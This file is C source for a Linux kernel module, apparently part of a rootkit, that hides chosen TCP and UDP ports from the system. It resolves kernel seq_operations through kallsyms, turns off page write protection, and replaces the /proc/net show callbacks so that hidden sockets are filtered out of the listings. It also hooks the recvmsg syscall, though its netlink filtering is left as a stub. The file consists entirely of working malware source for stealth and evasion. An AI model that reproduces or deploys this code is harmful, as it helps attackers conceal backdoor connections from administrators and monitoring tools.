#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <net/inet_sock.h>
#include <linux/seq_file.h>
#include <linux/rwlock.h>

#include "socket_hiding.h"
#include "syscall_hooking.h"
#include "helper.h"

static int enabled = 0;

/*
 * Data structures for hidden sockets
 */
static DEFINE_RWLOCK(sockets_lock);
static LIST_HEAD(hidden_sockets);

struct hidden_socket {
    struct list_head list;
    unsigned short port;
    unsigned char proto;
};

/*
 * Hooking function pointers
 */

/*
 * recvmsg syscall
 */
static t_syscall orig_recvmsg = NULL;

/*
 * Sequence operations, for tcp and udp proc entries.
 * Holding pointers to 'show'
 */
static struct seq_operations *tcp_ops;
static struct seq_operations *tcp6_ops;
static struct seq_operations *udp_ops;
static struct seq_operations *udp6_ops;

/*
 * Original show methods
 */
typedef int (*t_seq_show) (struct seq_file *, void*);
static t_seq_show orig_tcp_seq_show = NULL;
static t_seq_show orig_tcp6_seq_show = NULL;
static t_seq_show orig_udp_seq_show = NULL;
static t_seq_show orig_udp6_seq_show = NULL;

/*
 * Check if socket is hidden
 *
 * Expects read lock
 */
static struct hidden_socket *is_hidden(unsigned short port, unsigned char proto) {

    struct hidden_socket *entry;

    list_for_each_entry(entry, &hidden_sockets, list) {
        if (entry->port == port && entry->proto == proto) {
            return entry;
        }
    }
    return NULL;
}

#define MODE_UDP    0
#define MODE_UDP6   1
#define MODE_TCP    2
#define MODE_TCP6   3

/*
 * Filter hidden sockets, otherwise return original result
 */
static int hooked_show(struct seq_file *seq, void *v, int type) {

    struct inet_sock *inet;
    int res;

    if (SEQ_START_TOKEN != v) {

        /* filter */
        inet = inet_sk((struct sock *) v);

        read_lock(&sockets_lock);
        res = is_hidden(ntohs(inet->inet_sport), type < MODE_TCP ? PROTO_UDP : PROTO_TCP) != NULL;
        read_unlock(&sockets_lock);

        if (res)
            return 0;
    }

    switch (type) {
        case MODE_UDP:
            return orig_udp_seq_show(seq, v);
        case MODE_UDP6:
            return orig_udp6_seq_show(seq, v);
        case MODE_TCP:
            return orig_tcp_seq_show(seq, v);
        case MODE_TCP6:
            return orig_tcp6_seq_show(seq, v);
        default:
            return 0;
    }
}

static int hooked_tcp_show(struct seq_file *seq, void *v) {
    return hooked_show(seq, v, MODE_TCP);
}

static int hooked_tcp6_show(struct seq_file *seq, void *v) {
    return hooked_show(seq, v, MODE_TCP6);
}

static int hooked_udp_show(struct seq_file *seq, void *v) {
    return hooked_show(seq, v, MODE_UDP);
}

static int hooked_udp6_show(struct seq_file *seq, void *v) {
    return hooked_show(seq, v, MODE_UDP6);
}

/*
 * Recvmsg hook
 *
 */
static asmlinkage long hooked_recvmsg(const struct pt_regs *pt_regs) {

    struct user_msghdr __user *msg;
    struct user_msghdr kmsg;
    struct iovec kmsg_iov;
    struct nlmsghdr *hdr;
    void *base_buf = NULL;
    ssize_t ret, size;
    int _res;

    /*
     * Run the original recvmsg
     */
    if (0 >= (ret = orig_recvmsg(pt_regs))) {
        return ret;
    }

    /*
     * Get the netlink msg from the user buffer into kernel space
     * We have to copy nested data
     */
    msg = (struct user_msghdr __user *) pt_regs->si;
    if (0 != copy_from_user(&kmsg, msg, sizeof(*msg)) ||
        0 != copy_from_user(&kmsg_iov, kmsg.msg_iov, sizeof(*kmsg.msg_iov)) ||
        NULL == (base_buf = kmalloc(ret, GFP_KERNEL)) ||
        0 != copy_from_user(base_buf, kmsg_iov.iov_base, ret))
    {
        kfree(base_buf);
        return ret;
    }
    hdr = (struct nlmsghdr *) base_buf;

    /*
     * Iterate through all entries
     */
    while(hdr != NULL && NLMSG_OK(hdr, ret)) {

        if (hdr->nlmsg_type == NLMSG_DONE || hdr->nlmsg_type == NLMSG_ERROR) {
            goto ret_label;
        }

        //TODO check if hidden then
        if (0) {

        } else {
            hdr = NLMSG_NEXT(hdr, ret);
        }
    }

    /*
     * Copy modified netlink msg back to user
     */
    _res =  copy_to_user(kmsg_iov.iov_base, base_buf, ret) &&
            copy_to_user(kmsg.msg_iov, &kmsg_iov, sizeof(*kmsg.msg_iov)) &&
            copy_to_user(msg, &kmsg, sizeof(*msg));

ret_label:
    kfree(base_buf);
    return ret;
}

/*
 * Hide a socket
 */
int hide_socket(unsigned short port, unsigned char proto) {

    int ret = -1;
    struct hidden_socket *entry;

    if (enabled) {
        write_lock(&sockets_lock);

        /* check if already hidden */
        if (is_hidden(port, proto) == NULL) {

            /* allocate new struct and insert data */
            if (NULL != (entry = kmalloc(sizeof(struct hidden_socket), GFP_KERNEL))) {
                entry->port = port;
                entry->proto = proto;
                list_add_tail(&entry->list, &hidden_sockets);
                ret = 0;
            }
        }

        write_unlock(&sockets_lock);
    }

    return ret;
}

/*
 * Unhide a socket
 */
int unhide_socket(unsigned short port, unsigned char proto) {

    struct hidden_socket *entry;
    int ret = -1;

    if (enabled) {
        write_lock(&sockets_lock);

        /* Remove socket from list and free memory */
        if ((entry = is_hidden(port, proto)) != NULL) {
            list_del(&entry->list);
            kfree(entry);
            ret = 0;
        }

        write_unlock(&sockets_lock);
    }

    return ret;
}

/*
 * Enable socket hiding
 */
int enable_socket_hiding(void) {

    unsigned long i;

    /*
     * get seq_operations for protocols via kallsyms
     */

    if (0 == (i = kallsyms_lookup_name("tcp4_seq_ops"))) {
        return -1;
    }
    tcp_ops = (struct seq_operations *) i;
    orig_tcp_seq_show = tcp_ops->show;

    if (0 == (i = kallsyms_lookup_name("tcp6_seq_ops"))) {
        return -1;
    }
    tcp6_ops = (struct seq_operations *) i;
    orig_tcp6_seq_show = tcp6_ops->show;

    if (0 == (i = kallsyms_lookup_name("udp_seq_ops"))) {
        return -1;
    }
    udp_ops = (struct seq_operations *) i;
    orig_udp_seq_show = udp_ops->show;

    if (0 == (i = kallsyms_lookup_name("udp6_seq_ops"))) {
        return -1;
    }
    udp6_ops = (struct seq_operations *) i;
    orig_udp6_seq_show = udp6_ops->show;

    /*
     * Hook show methods
     */
    unprotect_paging_mode();

    tcp_ops->show = hooked_tcp_show;
    tcp6_ops->show = hooked_tcp6_show;
    udp_ops->show = hooked_udp_show;
    udp6_ops->show = hooked_udp6_show;

    protect_paging_mode();

    /*
     * hook recvmsg syscall
     */
    orig_recvmsg = (t_syscall) get_original_syscall(__NR_recvmsg);
    add_syscall_hook(__NR_recvmsg, (unsigned long *) hooked_recvmsg);

    enabled = 1;
    return 0;
}

/*
 * Disable socket hiding
 */
void disable_socket_hiding(void) {

    struct hidden_socket *entry, *tmp;

    enabled = 0;

    /*
     * Unhook recvmsg
     */
    rm_syscall_hook(__NR_recvmsg);

    /*
     * Remove proc show hooks
     */
    unprotect_paging_mode();

    tcp_ops->show = orig_tcp_seq_show;
    tcp6_ops->show = orig_tcp6_seq_show;
    udp_ops->show = orig_udp_seq_show;
    udp6_ops->show = orig_udp6_seq_show;

    protect_paging_mode();

    /*
     * Remove all hidden sockets from list
     */
    write_lock(&sockets_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_sockets, list) {
        list_del(&entry->list);
        kfree(entry);
    }
    write_unlock(&sockets_lock);

}